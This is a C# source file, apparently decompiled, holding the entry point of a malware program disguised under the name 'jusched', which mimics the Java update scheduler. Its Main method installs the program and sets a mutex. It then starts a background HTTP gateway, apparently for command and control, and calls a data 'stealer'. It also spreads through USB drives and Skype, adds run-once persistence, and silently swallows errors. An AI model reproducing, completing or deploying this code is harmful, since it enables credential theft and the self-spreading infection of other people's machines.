using System;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;

namespace jusched;

[StandardModule]
internal sealed class Module1
{
	[STAThread]
	public static void Main()
	{
		Install.Mutex_0();
		Install.instacion_0();
		try
		{
			string url = "http://www.google.com";
			if (global_0.HasInternetConnection(ref url))
			{
				HttpHandler.gateway_0.IsBackground = true;
				HttpHandler.gateway_0.Start();
				stealer.not_ste0();
			}
			Spreaders.spread_0.IsBackground = true;
			Spreaders.spread_0.Start(Configuration.usbname);
			Utils.check_1.IsBackground = true;
			Utils.check_1.Start();
			Spreaders.runonce_0();
			SkypeSP.skype_0();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		Spreaders.start_id();
		Application.Run();
	}
}
